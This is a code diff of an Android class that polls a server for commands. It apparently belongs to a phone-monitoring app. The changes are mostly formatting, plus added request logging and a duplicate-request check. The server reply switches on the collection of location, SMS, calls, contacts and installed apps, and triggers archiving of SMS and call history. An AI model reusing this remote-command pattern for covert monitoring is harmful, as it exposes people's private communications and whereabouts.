@@ -21,15 +21,16 @@ import com.inet.android.utils.Logging;
 
 /**
  * Periodic request class
+ * 
  * @author johny homicide
- *
+ * 
  */
 public class PeriodicRequest extends DefaultRequest {
 	private final String LOG_TAG = "PeriodicRequest";
 	static RequestDataBaseHelper db;
 	private final int type = 2;
 	Context ctx;
-	
+
 	public PeriodicRequest(Context ctx) {
 		super(ctx);
 		this.ctx = ctx;
@@ -40,7 +41,7 @@ public class PeriodicRequest extends DefaultRequest {
 		PeriodicRequestTask frt = new PeriodicRequestTask();
 		frt.execute(request);
 	}
-	
+
 	class PeriodicRequestTask extends AsyncTask<String, Void, Void> {
 
 		@Override
@@ -64,12 +65,15 @@ public class PeriodicRequest extends DefaultRequest {
 	protected void sendPostRequest(String request) {
 		String str = null;
 		try {
+			Logging.doLog(LOG_TAG, request, request);
 			str = Caller.doMake(request, "periodic", ctx);
 		} catch (IOException e) {
 			e.printStackTrace();
 			db = new RequestDataBaseHelper(ctx);
-			db.addRequest(new RequestWithDataBase(request, type));
-	
+			
+			if (db.getExistType(type) == false) {
+				db.addRequest(new RequestWithDataBase(request, type));
+			}
 		}
 		if (str != null) {
 			getRequestData(str);
@@ -81,25 +85,26 @@ public class PeriodicRequest extends DefaultRequest {
 			Editor ed = sp.edit();
 			ed.putString("code", "1");
 			ed.commit();
-			
+
 		}
 	}
 
 	@Override
 	protected void getRequestData(String response) {
-		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);
-		
+		Logging.doLog(LOG_TAG, "getResponseData: " + response,
+				"getResponseData: " + response);
+
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(ctx);
 		Editor ed = sp.edit();
-		
+
 		JSONObject jsonObject;
 		try {
 			jsonObject = new JSONObject(response);
 		} catch (JSONException e) {
 			return;
 		}
-		
+
 		String str = null;
 		try {
 			str = jsonObject.getString("code");
@@ -111,21 +116,21 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("code", "");
 		}
-		
+
 		// режим ожидания принятия решения
 		if (str.equals("1")) {
 			ed.putString("period", "1");
 			ed.commit();
 			return;
 		}
-		
-		// переход в пассивный режим работы 
+
+		// переход в пассивный режим работы
 		if (str.equals("3")) {
 			ed.putString("period", "10");
 			ed.commit();
 			return;
 		}
-		
+
 		// ошибки
 		if (str.equals("0")) {
 			String errstr = null;
@@ -142,7 +147,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.commit();
 			return;
 		}
-		
+
 		// активный режим работы
 		if (str.equals("2")) {
 			ed.putString("period", "1");
@@ -158,7 +163,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("geo_mode");
 		} catch (JSONException e) {
@@ -169,7 +174,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo_mode", "1");
 		}
-		
+
 		try {
 			str = jsonObject.getString("sms");
 		} catch (JSONException e) {
@@ -191,7 +196,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("call", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("telbook");
 		} catch (JSONException e) {
@@ -215,7 +220,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("listapp", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("arhsms");
 		} catch (JSONException e) {
@@ -223,7 +228,7 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("arhsms", str);
-				ArchiveSms arhSms = new ArchiveSms();
+			ArchiveSms arhSms = new ArchiveSms();
 			arhSms.execute(ctx);
 		} else {
 			ed.putString("arhsms", "0");
@@ -236,7 +241,7 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("arhcall", str);
-				ArchiveCall arhCall = new ArchiveCall();
+			ArchiveCall arhCall = new ArchiveCall();
 			arhCall.execute(ctx);
 		} else {
 			ed.putString("arhcall", "0");
@@ -263,7 +268,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("recall", "0");
 		}
-		
+
 		try {
 			str = jsonObject.getString("UTCT");
 		} catch (JSONException e) {
@@ -318,7 +323,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("brk_to", "");
 		}
-		
+
 		try {
 			str = jsonObject.getString("error");
 		} catch (JSONException e) {
